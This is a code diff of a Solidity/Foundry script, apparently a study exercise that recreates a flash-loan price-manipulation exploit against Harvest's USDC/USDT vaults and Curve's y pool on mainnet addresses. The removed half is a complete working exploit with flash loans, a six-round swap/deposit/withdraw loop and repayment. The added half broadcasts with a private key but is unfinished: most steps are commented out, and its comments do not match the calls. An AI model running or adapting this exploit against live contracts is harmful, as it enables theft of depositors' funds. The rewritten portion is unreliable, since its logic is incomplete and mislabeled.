@@ -5,99 +5,107 @@ import "./interface.sol";
 
 import "forge-std/Script.sol";
 import "forge-std/Test.sol";
+// interface IUniswapV2Pair {
+//     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+//     function skim(address to) external;
+//     function token0() external view returns (address);
+//     function token1() external view returns (address);
+//     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+//     function price0CumulativeLast() external view returns (uint256);
+//     function price1CumulativeLast() external view returns (uint256);
+//     function balanceOf(address account) external view returns (uint256);
+//     function approve(address spender, uint256 value) external returns (bool);
+//     function transfer(address to, uint256 value) external returns (bool);
+//     function transferFrom(address from, address to, uint256 value) external returns (bool);
+//     function burn(address to) external returns (uint256 amount0, uint256 amount1);
+// }
 
-// address constant wbnb = 0x0dE8FCAE8421fc79B29adE9ffF97854a424Cad09;
-// address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
-// address constant tether = address(0x55d398326f99059fF775485246999027B3197955);
-// address constant busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
-// IUniswapV2Router constant uniswapV2Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
-// IUniSwapV2 constant daiweth = IUniSwapV2(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
+interface IUniswapV2Callee {
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
+}
 
-/// @dev
-/// forge script -f exam2 Exam2
-contract Exam2 is Script, Test {
-    uint256 immutable secret = vm.envUint("PRIVATE_KEY");
-    address immutable attacker = vm.rememberKey(secret);
+// interface IUniswapV2Pair {
+//     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+// }
 
-    // CONTRACTS
-    // Uniswap ETH/USDC LP (UNI-V2)
-    IUniswapV2Pair usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
-    // Uniswap ETH/USDT LP (UNI-V2)
-    IUniswapV2Pair usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
-    // Curve y swap
-    IcurveYSwap curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
-    // Harvest USDC pool
-    IHarvestUsdcVault harvest = IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
+interface ERC20 {
+    function balanceOf(address) external returns (uint256);
+    function approve(address, uint256) external;
+    function transfer(address, uint256) external;
+    function withdraw(uint256) external;
+}
 
-    // ERC20s
-    // 6 decimals on usdt
-    IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    // 6 decimals on usdc
-    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    // 6 decimals on yusdc
-    IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
-    // 6 decimals on yusdt
-    IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
-    // 6 decimals on fUSDT
-    IERC20 fusdt = IERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
-    // 6 decimals on fUSDC
-    IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
+interface HVault {
+    function deposit(uint256) external;
+    function balanceOf(address) external returns (uint256);
+    function withdraw(uint256) external;
+}
 
-    uint256 usdcLoan = 50_000_000 * 10 ** 6;
-    uint256 usdcRepayment = (usdcLoan * 100_301) / 100_000;
-    uint256 usdtLoan = 17_300_000 * 10 ** 6;
-    uint256 usdtRepayment = (usdtLoan * 100_301) / 100_000;
-    uint256 usdcBal;
-    uint256 usdtBal;
+interface YCurve {
+    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
+}
 
-    function setUp() public {
-        // cheats.createSelectFork("upside", 1_111_9476); //fork mainnet at block 1_111_9476
+interface CurveStrategy {
+    function deposit(uint256) external;
+    function withdraw(uint256) external;
+}
+
+contract Rw2 is IUniswapV2Callee, Script {
+    HVault h = HVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
+    CurveStrategy c = CurveStrategy(0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c);
+    YCurve yCurve = YCurve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
+    IUniswapV2Pair WETH_USDT = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
+    IUniswapV2Pair WETH_USDC = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
+    ERC20 usdt = ERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    ERC20 usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    ERC20 weth = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+
+    uint256 secret = vm.envUint("PRIVATE_KEY");
+    address attacker = vm.rememberKey(secret);
+
+    function setUp() external {
+        vm.label(address(WETH_USDT), "ETH_usdt");
+        vm.label(address(weth), "weth");
+        vm.label(address(usdt), "usdt");
+        vm.label(address(usdc), "usdc");
+        vm.label(address(yCurve), "yCurve");
+        vm.label(address(attacker), "attacker");
     }
 
-    function run() public {
-        console.log(attacker.balance);
-        console.log(address(this).balance);
-        // testExploit();
+    function run() external {
+        vm.startBroadcast(secret);
+        console.log(IUniswapV2Pair(WETH_USDT).token0() == address(weth));
+        console.log(IUniswapV2Pair(WETH_USDT).token1() == address(usdt));
+        (uint256 a, uint256 b,) = IUniswapV2Pair(WETH_USDT).getReserves();
+        console.log("%d %d", a, b);
+        console.log("%d %d", b / 1e6, b % 1e6);
+        /// 1. Flashloan usdc from Uniswap usdc-usdt pair
+        IUniswapV2Pair(WETH_USDT).swap(0, 50_000_000 * 1e6, attacker, hex"123412341234");
     }
 
-    function testExploit() public {
-        usdt.approve(address(curveYSwap), type(uint256).max);
-        usdc.approve(address(curveYSwap), type(uint256).max);
-        usdc.approve(address(harvest), type(uint256).max);
-        usdt.approve(address(usdtPair), type(uint256).max);
-        usdc.approve(address(usdcPair), type(uint256).max);
-        emit log_named_uint("Before exploitation, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
-        emit log_named_uint("Before exploitation, USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);
-        usdcPair.swap(usdcLoan, 0, address(this), "0x");
+    function uniswapV2Call(address, uint256, uint256, bytes calldata) public {
+        console.log("uniswapV2Call");
+        require(usdt.balanceOf(attacker) == 50_000_000 * 1e6, "flashloan failed");
+        console.log("flashloan success");
 
-        emit log_named_uint("After exploitation, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
-        emit log_named_uint("After exploitation, USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);
+        // if (msg.sender == WETH_USDT) {
+        //     /// 2. check flashloan amount
+        //     require(IERC20(usdt).balanceOf(attacker) == 50_000_000 * 1e6, "flashloan failed");
+        //     console.log("flashloan success");
+
+        //     /// 3. deposit usdc to ySwap
+        //     IERC20(usdc).approve(ySwap, 50_000_000 * 1e6);
+        //     IFarm(ySwap).deposit(50_000_000 * 1e6);
+
+        //     /// 4. withdraw fusdt from ySwap
+        //     IFarm(ySwap).withdraw(50_000_000 * 1e6);
+
+        //     /// 5. exchange fusdt to usdt
+        //     IERC20(fusdt).approve(usdt, 50_000_000 * 1e6);
+        //     ICurve(usdt).exchange_underlying(1, 0, 50_000_000 * 1e6, 50_000_000 * 1e6);
+
+        //     /// 6. repay flashloan
+        //     IERC20(usdt).transfer(ETH_usdt, 50_000_000 * 1e6);
+        // }
     }
-
-    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
-        if (msg.sender == address(usdcPair)) {
-            emit log_named_uint("Flashloan, Amount of USDC received:", usdc.balanceOf(address(this)) / 1e6);
-            usdtPair.swap(0, usdtLoan, address(this), "0x");
-            bool usdcSuccess = usdc.transfer(address(usdcPair), usdcRepayment);
-        }
-
-        if (msg.sender == address(usdtPair)) {
-            emit log_named_uint("Flashloan, Amount of USDT received:", usdt.balanceOf(address(this)) / 1e6);
-            for (uint256 i = 0; i < 6; i++) {
-                theSwap(i);
-            }
-            usdt.transfer(msg.sender, usdtRepayment);
-        }
-    }
-
-    function theSwap(uint256 i) internal {
-        curveYSwap.exchange_underlying(2, 1, 17_200_000 * 10 ** 6, 17_000_000 * 10 ** 6);
-        harvest.deposit(49_000_000_000_000);
-        curveYSwap.exchange_underlying(1, 2, 17_310_000 * 10 ** 6, 17_000_000 * 10 ** 6);
-        harvest.withdraw(fusdc.balanceOf(address(this)));
-        emit log_named_uint("After swap, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
-        emit log_named_uint("After swap ,USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);
-    }
-
-    receive() external payable {}
 }
